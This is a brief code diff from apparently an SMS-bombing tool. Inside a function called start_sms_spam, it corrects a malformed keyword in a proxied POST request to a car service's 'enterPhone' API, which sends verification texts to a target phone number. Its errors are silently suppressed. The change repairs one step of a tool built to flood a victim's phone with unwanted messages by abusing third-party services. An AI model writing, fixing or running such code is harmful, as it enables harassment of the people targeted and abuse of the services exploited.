@@ -694,7 +694,7 @@ async def start_sms_spam(phone, cycles, message: Message):
                 pass
             try:
                 logger.debug("New request")
-                post("https://api.carsmile.com/", son={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers, timeout=2, proxies=proxies)
+                post("https://api.carsmile.com/", json={"operationName": "enterPhone", "variables": {"phone": phone}, "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"}, headers=headers, timeout=2, proxies=proxies)
             except:
                 pass
             try:
